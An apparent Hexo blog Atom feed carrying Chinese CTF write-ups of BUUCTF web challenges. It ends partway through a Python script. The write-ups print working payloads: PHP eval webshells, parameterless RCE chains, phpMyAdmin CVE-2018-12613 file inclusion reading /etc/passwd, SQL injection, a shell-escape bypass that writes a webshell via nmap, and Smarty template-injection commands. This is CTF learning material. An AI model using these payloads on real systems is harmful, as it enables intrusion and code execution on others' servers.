<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2021-05-23T08:55:31.342Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2021/05/23/hello-world/"/>
    <id>http://example.com/2021/05/23/hello-world/</id>
    <published>2021-05-23T08:55:31.342Z</published>
    <updated>2021-05-23T08:55:31.342Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>buuctf-web-7</title>
    <link href="http://example.com/2021/05/21/buuctf/buuctf-web-7/"/>
    <id>http://example.com/2021/05/21/buuctf/buuctf-web-7/</id>
    <published>2021-05-21T12:06:19.000Z</published>
    <updated>2021-05-23T11:05:49.979Z</updated>
    
    <content type="html"><![CDATA[<p>[GXYCTF2019]BabyUpload</p><p>[GXYCTF2019]禁止套娃–无参数RCE</p><p>[BJDCTF2020]The mystery of ip–模板注入</p><h3 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h3><p>上传了一个正常jpg图片，居然报错了</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/5D150C03D0DA8BB36A68C3AFD177A9D2"></p><p>接着尝试了png，gif，txt文件，也全都上传失败，上传没有后缀名的也上传失败，这是为毛？？</p><p>看了wp，发现别人是可以上传jpg和png的？？？有毒？</p><p>上传<code>.htaccess</code>文件试试</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/3F2436923C8CD4F3DB7D7B98B82A5754"></p><p>啊，这，，，看来是题目坏了，总之做法就是，上传<code>.htaccess</code>文件之后，再上传png文件即可。</p><p>注意题目过滤了<code>&lt;?</code>，所以使用<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;a&#39;]);&lt;/script&gt;</code>来绕过。</p><h3 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h3><p><img src="https://img01.sogoucdn.com/app/a/100520146/4F475872E09862158C20B39D1412DFFB"></p><p>页面啥也没有，查看源码和看了http头啥也没有</p><p>扫一下网站后台试试</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/14A79A0DBDDF12866EE55413F25BEE7F"></p><p>存在.git泄露问题，用工具下载源码</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/ABD574303E341C4492A3F3E13C7402A7"></p><p>查看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flag在哪里呢？&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;还差一点哦！&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;再好好想想！&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;还想读flag，臭弟弟！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>是要传入一个exp参数，</p><p>这里有三重过滤</p><blockquote><p>1.preg_match(‘/data://|filter://|php://|phar:///i’, $_GET[‘exp’])  过滤掉php常用的几个伪协议，这样就不能去读取文件了</p><p>2.preg_replace(‘/[a-z,_]+((?R)?\)/‘, NULL, $_GET[‘exp’])  ,用正则来匹配无参数的函数，(?R)?表示递归引用之前的表达式，那么这里只能传入没有参数的函数，像这样的：xxx(xxx(xxx(…)));</p><p>3.preg_match(‘/et|na|info|dec|bin|hex|oct|pi|log/i’, $_GET[‘exp’])   正则匹配掉了et/na/info等关键字，很多函数都用不了</p></blockquote><p>关于无参数RCE，这种时候就需要翻手册了，查找无参数可利用的函数</p><p>首先，需要一个浏览目录内的所有文件的函数，这个当然首选：<code>scandir()</code>。当<code>scandir()</code>传入<code>&#39;.&#39;</code>，可以列出当前目录的所有文件</p><p>所以如果有函数能够返回<code>&#39;.&#39;</code>的话，就可以利用它作为<code>scandir()</code>的参数</p><blockquote><p>localeconv()函数返回一包含本地数字及货币格式信息的数组</p></blockquote><p><img src="https://img02.sogoucdn.com/app/a/100520146/A7568CBACBEC11B0A0338E06C2621FE6"></p><p>接下来只需要使得指针指向这个数组内的第一个值</p><blockquote><p>current() 函数返回数组中的当前元素的值。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p></blockquote><blockquote><p>pos() 函数返回数组中的当前元素的值。该函数是 current() 函数的别名。每个数组中都有一个内部的指针指向它的”当前”元素，初始指向插入到数组中的第一个元素。</p></blockquote><p>payload：<code>?exp=var_dump(scandir(current(localeconv())));</code></p><p><img src="https://img03.sogoucdn.com/app/a/100520146/8C50370BB0FA9188DD4EA877C153F00C"></p><p>接下来看如何读取到<code>flag.php</code></p><blockquote><p><code>next()</code> 函数将内部指针指向数组中的下一个元素，并输出。</p></blockquote><blockquote><p><code>array_reverse()</code> 函数返回翻转顺序的数组。</p></blockquote><p>把数组顺序倒一下，然后使用<code>next()</code>，就可以读到<code>flag</code>了</p><p>payload：<code>?exp=show_source(next(array_reverse(scandir(current(localeconv()))))); </code></p><p><img src="https://img01.sogoucdn.com/app/a/100520146/003E081A511451D036343C66F3F90E5F"></p><p><a href="https://shawroot.hatenablog.com/entry/2020/01/01/GXYCTF2019/BUUCTF-WEB%3A%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83">参考1</a></p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E6%B3%95%E5%9B%9B%EF%BC%9Asession-id">参考2</a></p><h3 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h3><p><img src="https://img02.sogoucdn.com/app/a/100520146/CF8FFD3D71CB0D673F07C5413AA12F76"></p><p>应该是SQL注入，但是没告诉我们参数以及注入的页面。</p><p>用工具扫一下</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/0D44F7BD51FFBDA3CB47A8CAFE015FA7"></p><p>发现存在phpmyadmin目录，访问一下</p><p><img src="https://img04.sogoucdn.com/app/a/100520146/3EE5D2F5BBFD669BE438DEDE914F7F80"></p><p>可以看到phpmyadmin的版本：4.8.1，搜索一下发现存在任意文件包含漏洞。<a href="https://www.cnblogs.com/leixiao-/p/10265150.html">cve-2018-12613</a></p><p>测试payload：<code>?target=db_datadict.php%253f/../../../../../../../../../etc/passwd</code></p><p><img src="https://img04.sogoucdn.com/app/a/100520146/1F86D503DE429EDE9886546EB40E36FD"></p><p>可以成功读取</p><p>尝试读取flag</p><p><code>?target=db_datadict.php%253f/../../../../../../../../../flag</code></p><p><img src="https://img02.sogoucdn.com/app/a/100520146/96B3EB23638AE297032F0569F07D015A"></p><p>我们还可以尝试一下任意代码执行</p><p>新建一张数据表</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/5260B330D1C9890CA709AFB8F0FCE58C"></p><p>之后插入数据<code>&lt;?php phpinfo();?&gt;</code>，或者执行SQL语句<code>INSERT INTO rce(code) VALUES(&quot;&lt;?php phpinfo(); ?&gt;&quot;);</code></p><p><img src="https://img02.sogoucdn.com/app/a/100520146/F2CCFBD44751BFDD386E944AE6B0652E"></p><p>接下来包含这个文件，但是首先要知道这个文件的路径</p><p>可以使用SQL语句来查询：<code>show global variables like &quot;%datadir%&quot;;</code></p><p><img src="https://img01.sogoucdn.com/app/a/100520146/EE819C3CE1CD514547C6D27DD81ECDD9"></p><p>接下来包含这个文件</p><p>linux中mysql文件的位置</p><p><img src="C:\Users\17295\AppData\Roaming\Typora\typora-user-images\image-20210522171616220.png" alt="image-20210522171616220"></p><p><code>?target=db_datadict.php%253f/../../../../../../../../../var/lib/mysql/test/test.ibd</code></p><p><img src="https://img04.sogoucdn.com/app/a/100520146/BFFE95A342D2BE7DF6DFD32D8BFDF9FA"></p><p>不知道为什么找不到文件。。。。。。</p><h3 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h3><p>index页面</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/4341666FD1AA9B7D2CD10541B21A4B90"></p><p>是这样一个页面，</p><p>flag页面，显示了自己的ip</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/2A188916F83D858441AC8D34283FDE9B"></p><p>hint页面，页面没有什么信息，但是查看源码有个注释信息</p><p><img src="https://img04.sogoucdn.com/app/a/100520146/A40EA7CE65262EB1F92A6EE7A6D76B11"></p><p>burp抓包看看</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/98B0DBDD4FBA276D9A23FDB57EB0E66E"></p><p>题目提示问为什么可以获取到客户端 ip，考虑是 XFF 或 Client-IP 这两个 header，添加<code>X-Forwarded-For: 127.0.0.1</code>之后，显示的ip确实变了，</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/3EE6CB2B0A156F09DF5807EA5C61AC8E"></p><p>这里应该是有问题的，测试了SQL注入和命令执行都不行，最后试试SSTI(Server-Side Template Injection)，即<strong>服务器端模板注入</strong>。</p><p>测试一下，是否可以进行逻辑运算<code>&#123;7*8&#125;</code></p><p><img src="https://img01.sogoucdn.com/app/a/100520146/9CED14F32517B74D373D23283BEA4536"></p><p>接下来试试执行命令<code>&#123;phpinfo();&#125;</code></p><p><img src="https://img02.sogoucdn.com/app/a/100520146/4408AC82E87DB8BE3BFEBBAA2F2F1989"></p><p>发生了报错，是多了和分号<code>;</code>，同时我们也看到这个网站所使用的模板<code>Smarty</code></p><p>接下来去掉分号看看，</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/34EDDC2FB05C915C5ADC43CBC71B7E1B"></p><p>接下来是找到flag了</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/03301E637F6C9E59B2FE288FA0E17164"></p><p>居然不在flag.php里面，接着找</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/1BDCF3B49D8B5AD651298FFF86BA07D0"></p><p>smarty注入payload</p><p>{if phpinfo()}{/if}<br>{if system(‘ls’)}{/if}<br>{ readfile(‘/flag’) }<br>{if show_source(‘/flag’)}{/if}<br>{if system(‘cat ../../../flag’)}{/if} #本题payload</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[GXYCTF2019]BabyUpload&lt;/p&gt;
&lt;p&gt;[GXYCTF2019]禁止套娃–无参数RCE&lt;/p&gt;
&lt;p&gt;[BJDCTF2020]The mystery of ip–模板注入&lt;/p&gt;
&lt;h3 id=&quot;GXYCTF2019-BabyUpload&quot;&gt;&lt;a hre</summary>
      
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
    <category term="无参数RCE" scheme="http://example.com/tags/%E6%97%A0%E5%8F%82%E6%95%B0RCE/"/>
    
    <category term="模板注入" scheme="http://example.com/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-web-6</title>
    <link href="http://example.com/2021/05/20/buuctf/buuctf-web-6/"/>
    <id>http://example.com/2021/05/20/buuctf/buuctf-web-6/</id>
    <published>2021-05-20T12:03:03.000Z</published>
    <updated>2021-05-23T11:05:57.557Z</updated>
    
    <content type="html"><![CDATA[<p>[GXYCTF2019]BabySQli1–union select特性</p><p>[BUUCTF 2018]Online Tool–绕过escapeshellarg、escapeshellcmd</p><p>[强网杯 2019]高明的黑客–shell脚本筛查</p><p>[RoarCTF 2019]Easy Java–WEB-INF配置文件</p><span id="more"></span><h3 id="GXYCTF2019-BabySQli1"><a href="#GXYCTF2019-BabySQli1" class="headerlink" title="[GXYCTF2019]BabySQli1"></a><strong>[GXYCTF2019]BabySQli1</strong></h3><p><img src="https://img04.sogoucdn.com/app/a/100520146/58B7AC39609120DA830B5195BDB056C2"> </p><p>随便输入试试</p><p><img src="https://img01.sogoucdn.com/app/a/100520146/195049B8D6EEFA89A69054005CCCAEB6"> </p><p><img src="https://img02.sogoucdn.com/app/a/100520146/9FEED310C7B9F4B02BEACB5E264DEB10"> </p><p>根据提示不同，可以看到确实是存在admin用户的，</p><p>尝试一下注入，开始的时候在pw字段进行注入，但是尝试了很多之后，都提示wrong pass</p><p>在name字段进行测试，</p><p>发送name=admin’发现有报错，</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/D59DEB5F5284E84D8490B1778B779497"> </p><p>name=admin’的话，提示wrong usr，</p><p>所以，应该是单引号字符型注入，尝试了</p><p>name=admin’+and+0#&amp;pw=1   报错wrong usr</p><p>name=admin’+and+1#&amp;pw=1   报错wrong pass</p><p>and语句被执行了，尝试or，发现or被过滤了，但是Or可以绕过，所以接下来使用Order by来探测列数，发现有三列</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/ACC3A7966FF0007D7FA93C22481C712A"> </p><p>接下来使用联合注入，发现括号被过滤了，，，，，，那该怎么办</p><p>不会做了，只能百度了。。。。。。</p><p>看了wp之后，发现是要利用sql语句的特性：<strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p><p><img src="https://img04.sogoucdn.com/app/a/100520146/6F24A03B845AC88D74A2B46411C4B7C6"> </p><p>构造payload</p><p>name=1’+union+select+1,’admin’,’123’#&amp;pw=123</p><p>但是还是提示wrong pass</p><p><img src="https://img01.sogoucdn.com/app/a/100520146/7B916E061625913961F84E7290660786"> </p><p>原来是因为，数据库中存储的是MD5，所以要把123的MD5值存进去，</p><p>name=1’+union+select+1,’admin’,’202cb962ac59075b964b07152d234b70’#&amp;pw=123</p><p><img src="https://img04.sogoucdn.com/app/a/100520146/3C1687198C9E04E625D1A8337C429722"></p><h3 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a><strong>[BUUCTF 2018]Online Tool</strong></h3><p>打开题目，直接给出源码，代码审计</p><p><img src="https://img03.sogoucdn.com/app/a/100520146/6906264FF89E43ED9A8AD2FB6A9911B8"> </p><p>这里涉及到两个函数，具体使用方法如下：</p><p><strong>escapeshellarg</strong> — 把字符串转码为可以在shell命令里使用的参数</p><p><strong>escapeshellarg()</strong> 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入shell函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell函数包含 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a>, <a href="https://www.php.net/manual/zh/function.system.php">system()</a> <a href="https://www.php.net/manual/zh/language.operators.execution.php">执行运算符</a> 。</p><p><strong>1.确保用户只传递一个参数给命令</strong></p><p><strong>2.用户不能指定更多的参数</strong></p><p><strong>3.用户不能执行不同的命令</strong></p><p><strong>escapeshellcmd</strong> — shell 元字符转义</p><p><strong>escapeshellcmd()</strong> 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 <a href="https://www.php.net/manual/zh/function.exec.php">exec()</a> 或 <a href="https://www.php.net/manual/zh/function.system.php">system()</a> 函数，或者 <a href="https://www.php.net/manual/zh/language.operators.execution.php">执行操作符</a> 之前进行转义。 </p><p>反斜线（\）会在以下字符之前插入： &amp;#;`|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 </p><p><strong>1.确保用户只执行一个命令</strong></p><p><strong>2.用户可以指定不限数量的参数</strong></p><p><strong>3.用户不能执行不同的命令</strong></p><p>这两个函数在一起用会有些问题</p><p>  传入的参数是：172.17.0.2’ -v -d a=1，经过escapeshellarg处理后变成了’172.17.0.2’&#39;‘ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p><p>  经过escapeshellcmd处理后变成’172.17.0.2’\‘’ -v -d a=1&#39;，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></p><p>  最后执行的命令是curl ‘172.17.0.2’\‘’ -v -d a=1&#39;，由于中间的\被解释为\而不再是转义字符，所以它后面的’没有被转义，与再后面的’配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1’，即向172.17.0.2\发起请求，POST 数据为a=1’。</p><p>简单的来说就是两次转译后出现了问题，没有考虑到单引号的问题，然后往下看，看到echo system(“nmap -T5 -sT -Pn –host-timeout 2 -F “.$host);这有个system来执行命令，而且有传参，肯定是利用这里了。</p><p>这里代码的本意是希望我们输入ip这样的参数做一个扫描，通过上面的两个函数来进行规则过滤转译，我们的输入会被单引号引起来，但是因为我们看到了上面的漏洞所以我们可以逃脱这个引号的束缚</p><p>这里常见的命令后注入操作如 | &amp; &amp;&amp;都不行，虽然我们通过上面的操作逃过了单引号，但escapeshellcmd会对这些特殊符号前面加上\来转移…</p><p>这时候就只有想想能不能利用nmap来做些什么了。</p><p>这时候搜索可以发现在nmap命令中 有一个参数-oG可以实现将命令和结果写到文件。</p><p>这个命令就是我们的输入可控！然后写入到文件！OK很自然的想到了上传一个一句话木马了</p><p>?host=’ <?php phpinfo();?> -oG shell.php ‘</p><p>在上面的源码中可以看到，提交之后会返回创建并返回一个文件夹的名称，我们生成的木马就在这个目录下，尝试访问</p><p><img src="https://img04.sogoucdn.com/app/a/100520146/7527BD61620A2465C3F9B537C03C1C7E"> </p><p>写入木马：?host=’ <?php @eval($_POST["cmd"]);?> -oG shell.php ‘</p><p>蚁剑连接：</p><p><img src="https://img04.sogoucdn.com/app/a/100520146/9110C738EB43EE7750988BAFD915D794"> </p><p><img src="https://img01.sogoucdn.com/app/a/100520146/1B7A16167195DDA121A6C0DB46D1AC9D"> </p><p>测试这两个函数的作用：</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/5DDCDBBB05377ACF9F811D53FE4D60ED"> </p><blockquote><p>‘ <?php phpinfo();?> -oG shell.php ‘</p></blockquote><blockquote><p>‘’&#39;‘ <?php phpinfo();?> -oG shell.php ‘&#39;‘’</p></blockquote><blockquote><p>‘’\‘’ &lt;?php phpinfo();?&gt; -oG shell.php ‘\‘’’</p></blockquote><p>执行命令时：\ <?php phpinfo();?> -oG shell.php \</p><p><strong>注意payload中：没有空格和引号都是不行的。</strong></p><h3 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a><strong>[强网杯 2019]高明的黑客</strong></h3><p><img src="https://img01.sogoucdn.com/app/a/100520146/FA75AB957576DFDAE9AB75087BF6E505"> </p><p>看到说源码备份到了<a href="http://www.tar.gz,访问一下,下载下来/">www.tar.gz，访问一下，下载下来</a></p><p>解压之后就很奇怪了，有2000多个文件，</p><p><img src="https://img01.sogoucdn.com/app/a/100520146/636A28F5FCED1609164FED4AC299F21E"> </p><p>随便打开一个看看</p><p><img src="https://img02.sogoucdn.com/app/a/100520146/8B4F696245E9BE6D599A9FFFBD35D5CD"> </p><p>可以看到有很多shell，但是看起来都不能使用，但是这些shell中应该有可以使用的，因为文件数量太大，需要写脚本筛查（大佬的脚本）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;开始时间：  &#x27;</span>+  time.asctime( time.localtime(time.time()) ))</span><br><span class="line">s1=threading.Semaphore(<span class="number">100</span>)  <span class="comment">#这儿设置最大的线程数</span></span><br><span class="line">filePath = <span class="string">r&quot;C:/Users/17295/Desktop/www/src&quot;</span></span><br><span class="line">os.chdir(filePath)<span class="comment">#改变当前的路径</span></span><br><span class="line">requests.adapters.DEFAULT_RETRIES = <span class="number">5</span><span class="comment">#设置重连次数，防止线程数过高，断开连接</span></span><br><span class="line">files = os.listdir(filePath)</span><br><span class="line">session = requests.Session()</span><br><span class="line">session.keep_alive = <span class="literal">False</span> <span class="comment"># 设置连接活跃状态为False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_content</span>(<span class="params">file</span>):</span></span><br><span class="line">  s1.acquire()</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;trying  &#x27;</span>+file+ <span class="string">&#x27;   &#x27;</span>+ time.asctime( time.localtime(time.time()) ))</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(file,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:<span class="comment">#打开php文件，提取所有的$_GET和$_POST的参数</span></span><br><span class="line">      gets = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_GET\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">      posts = <span class="built_in">list</span>(re.findall(<span class="string">&#x27;\$_POST\[\&#x27;(.*?)\&#x27;\]&#x27;</span>, f.read()))</span><br><span class="line">  data = &#123;&#125;<span class="comment">#所有的$_POST</span></span><br><span class="line">  params = &#123;&#125;<span class="comment">#所有的$_GET</span></span><br><span class="line">  <span class="keyword">for</span> m <span class="keyword">in</span> gets:</span><br><span class="line">    params[m] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">  <span class="keyword">for</span> n <span class="keyword">in</span> posts:</span><br><span class="line">    data[n] = <span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span></span><br><span class="line">    </span><br><span class="line">  url = <span class="string">&#x27;http://da91d275-8eeb-4b60-bf11-81cdbc3f629b.node3.buuoj.cn/src/&#x27;</span>+file</span><br><span class="line">  req = session.post(url, data=data, params=params)<span class="comment">#一次性请求所有的GET和POST</span></span><br><span class="line">  req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">  req.encoding = <span class="string">&#x27;utf-8&#x27;</span></span><br><span class="line">  content = req.text</span><br><span class="line">  <span class="comment">#print(content)</span></span><br><span class="line">  <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:<span class="comment">#如果发现有可以利用的参数，继续筛选出具体的参数</span></span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> gets:</span><br><span class="line">      req = session.get(url+<span class="string">&#x27;?%s=&#x27;</span>%a+<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>)</span><br><span class="line">      content = req.text</span><br><span class="line">      req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">      <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">        flag = <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag != <span class="number">1</span>:</span><br><span class="line">      <span class="keyword">for</span> b <span class="keyword">in</span> posts:</span><br><span class="line">        req = session.post(url, data=&#123;b:<span class="string">&quot;echo &#x27;xxxxxx&#x27;;&quot;</span>&#125;)</span><br><span class="line">        content = req.text</span><br><span class="line">        req.close()<span class="comment"># 关闭请求  释放内存</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;xxxxxx&quot;</span> <span class="keyword">in</span> content:</span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">1</span>:<span class="comment">#flag用来判断参数是GET还是POST，如果是GET，flag==1，则b未定义；如果是POST，flag为0，</span></span><br><span class="line">      param = 